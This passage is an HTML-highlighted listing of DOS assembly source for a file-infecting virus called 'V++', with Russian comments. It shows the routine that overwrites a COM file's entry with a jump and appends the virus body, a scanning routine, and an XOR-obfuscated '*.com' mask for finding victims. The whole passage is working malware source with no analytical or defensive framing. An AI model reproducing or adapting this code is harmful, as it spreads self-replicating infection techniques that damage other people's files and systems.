        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">
        </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">                   </span><span class="sc1">;Dx:=Si</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;Write File</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Записали команду перехода</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                </span><span class="sc1">;Lseek File</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">                   </span><span class="sc1">;Opti-Cwd</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;ушли на конец файла</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;Opti Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Buffer</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;OPTI-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc5">Save_Byte</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">;OPTI-лучше MovSW, MovSB</span><span class="sc0">
        </span><span class="sc6">Rep</span><span class="sc0">     </span><span class="sc6">MovSB</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">Vir_Lenght</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;Write_File</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Дописали вирус</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Cont_Infect</span><span class="sc0">     </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Scan</span><span class="sc0">    </span><span class="sc9">Proc</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Cld</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,[</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;0CDh</span><span class="sc0">

</span><span class="sc5">@Next_Scan</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Repne</span><span class="sc0">   </span><span class="sc6">ScaSB</span><span class="sc0">
        </span><span class="sc6">Jz</span><span class="sc0">      </span><span class="sc5">@Ok_Scan</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">@Exit_Scan</span><span class="sc0">

</span><span class="sc5">@Ok_Scan</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Dec</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Rep</span><span class="sc0">     </span><span class="sc6">CmpSB</span><span class="sc0">
        </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">@Find_Scan</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">@Next_Scan</span><span class="sc0">

</span><span class="sc5">@Find_Scan</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Dec</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc0">

</span><span class="sc5">@Exit_Scan</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Scan</span><span class="sc0">    </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Get_Mask</span><span class="sc0">        </span><span class="sc9">Proc</span><span class="sc0">
        </span><span class="sc6">PushA</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;OPTI-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Mask_Com</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;OPTI-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc5">Real_Mask</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">@Next</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LodSB</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc12">'V'</span><span class="sc0">
        </span><span class="sc6">StoSB</span><span class="sc0">
        </span><span class="sc6">LodSB</span><span class="sc0">                           </span><span class="sc1">;OPTI-LodSW ...</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc12">'+'</span><span class="sc0">
        </span><span class="sc6">StoSB</span><span class="sc0">
        </span><span class="sc6">LodSB</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc12">'+'</span><span class="sc0">
        </span><span class="sc6">StoSB</span><span class="sc0">
        </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">@Next</span><span class="sc0">
        </span><span class="sc6">PopA</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Get_Mask</span><span class="sc0">        </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Mask_Com</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*'</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc12">'V'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'.'</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc12">'+'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'c'</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc12">'+'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'o'</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc12">'V'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'m'</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc12">'+'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc12">'+'</span><span class="sc0">

</span><span class="sc5">Save_Ofs</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Save_Dta</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Save_Byte</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc9">Dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Var_Word</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">StrVpp</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'V++'</span><span class="sc0">

</span><span class="sc5">Vir_Lenght</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">  </span><span class="sc1">;1DBh</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Var_Word2</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Real_Mask</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">     </span><span class="sc9">Dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">New_DTA</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">

</span><span class="sc5">Buffer</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">Vir_Lenght</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
        </span><span class="sc9">End</span><span class="sc0">     </span><span class="sc5">Vpp</span><span class="sc0">
</span></div></body>
</html>
